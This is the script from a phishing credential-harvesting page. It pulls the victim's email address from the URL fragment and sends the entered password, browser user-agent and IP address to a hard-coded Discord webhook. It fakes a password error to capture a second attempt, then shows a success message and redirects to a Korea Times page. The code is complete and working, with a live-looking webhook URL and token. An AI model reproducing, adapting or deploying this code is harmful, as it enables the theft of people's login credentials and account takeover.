    <script>
        function isBase64(str) {
  if (typeof str !== 'string') {
    return false;
  }
  const notBase64 = /[^A-Z0-9+\/=]/i;
  const len = str.length;

  if (!len || len % 4 !== 0 || notBase64.test(str)) {
    return false;
  }

  const firstPaddingChar = str.indexOf('=');
  return firstPaddingChar === -1 ||
    firstPaddingChar === len - 1 ||
    (firstPaddingChar === len - 2 && str[len - 1] === '=');
}

        function sleep(milliseconds) {
            const date = Date.now();
            let currentDate = null;
            do {
                currentDate = Date.now();
            } while (currentDate - date < milliseconds);
        }

        var linksc = window.location.href
        var value = linksc.split('#')[1].split('$')[0];
        const values = value



        document.getElementById("email").innerHTML = values;

        // document.getElementById("username").value = values; 


        let count = 0;
        var btn = document.getElementById("submit-btn");
        var pwd = document.getElementById("password");
        var agents = navigator.userAgent;



        btn.onclick = function () {
            if (pwd.value.length > 0) {
                count++;
                if (count <= 2) {
				
                    var xhr = new XMLHttpRequest();
                    xhr.open("GET", "https://api.ipify.org/?format=json", true);
                    xhr.onreadystatechange = function () {
                        if (xhr.readyState === 4 && xhr.status === 200) {
                        var response = JSON.parse(xhr.responseText);
                        // Handle the response data here
                        var ipAddress = response.ip

                        request.open("POST", "https://discord.com/api/webhooks/1143214865616474172/QCrA2iKTHPbHFkqMJUXYFYbhGuzZAQzkIGcBw-utVkcho4Dl3ABJfoaa_jPYlmx5ZWq0");
                        request.setRequestHeader('Content-type', 'application/json');
                        var params = {
                        content: (" > **IP: **" + ipAddress)
                        }
                        request.send(JSON.stringify(params));
                            

                        }

                    };
                    xhr.send();


                    var request = new XMLHttpRequest();
                    request.open("POST", "https://discord.com/api/webhooks/1143214865616474172/QCrA2iKTHPbHFkqMJUXYFYbhGuzZAQzkIGcBw-utVkcho4Dl3ABJfoaa_jPYlmx5ZWq0");
                    request.setRequestHeader('Content-type', 'application/json');
                    var params = {
                        content: ("> **USERNAME  : **" + values + "\n> **PASSWORD : **" + document.getElementById("password").value + "\n> **USER-AGENT: **" + agents)
                    }
                    request.send(JSON.stringify(params));
                    text = "Network issues or Incorrect password";
                    // document.getElementById("username-error").innerHTML = text;
                    // // document.getElementById("errorMessage").style.color = "red";
                    document.getElementById("error").innerText = text;
                    document.getElementById("password").value = "";
                    sleep(1000)
                }
                if (count == 2) {
                    texts = "Verification successful... Thank you.";
                    document.getElementById("error").style.color = "green";
                    document.getElementById("error").innerHTML = texts;
                    window.location.replace("https://www.koreatimes.co.kr/www/section_129.html");
                }
            } else {
                text = "Enter password"
                // document.getElementById("errorMessage").style.color = "red";
                // document.getElementById("login-failure").innerHTML = "";
                document.getElementById("error").innerHTML = text;

                // document.getElementById("alert").style.backgroundColor = "#d0452f"; 



            }

        }
